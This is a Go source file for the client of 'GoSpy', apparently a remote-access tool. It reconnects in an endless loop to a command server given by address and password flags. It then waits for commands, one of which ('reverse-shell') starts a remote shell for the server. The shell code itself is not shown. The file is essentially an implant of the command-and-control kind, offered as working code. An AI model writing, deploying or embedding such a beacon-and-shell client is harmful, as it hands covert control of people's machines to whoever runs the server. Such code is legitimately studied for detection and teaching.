package main

import (
	"flag"
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/comms"
	"log"
	"net"
	"os"
)

// commandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func commandLoop(c comms.Connection) (err error) {
	for {
		var messageBytes []byte
		messageBytes, err = c.RecvBytes()
		if err != nil {
			break
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", message)

		switch message {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			err = commands.PingReply(c)
			if err != nil {
				break
			}

		case "reverse-shell":
			// Run in a goroutine so that it can abandoned by the client (e.g. if it hangs forever) and this loop will
			// still respond.
			go commands.ReverseShellReply(c)

		}
	}
	return err
}

func main() {
	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
	password := flag.String("p", "", "the password to encrypt network data with")
	flag.Parse()

	for {
		log.Printf("Attempting connection to address: %s\n", *address)
		conn, err := net.Dial("tcp", *address)
		if err != nil {
			continue
		}

		var c comms.Connection

		if *password != "" {
			log.Println("Password supplied, using encrypted connection")
			c = comms.NewEncryptedConnection(conn, *password)
		} else {
			log.Println("No password supplied, using plaintext connection")
			c = comms.NewPlainConnection(conn)
		}

		log.Println("Successful connection")
		err = commandLoop(c)
		_ = c.Close()
		log.Printf("Connection dropped: %s\n", err.Error())
	}
}
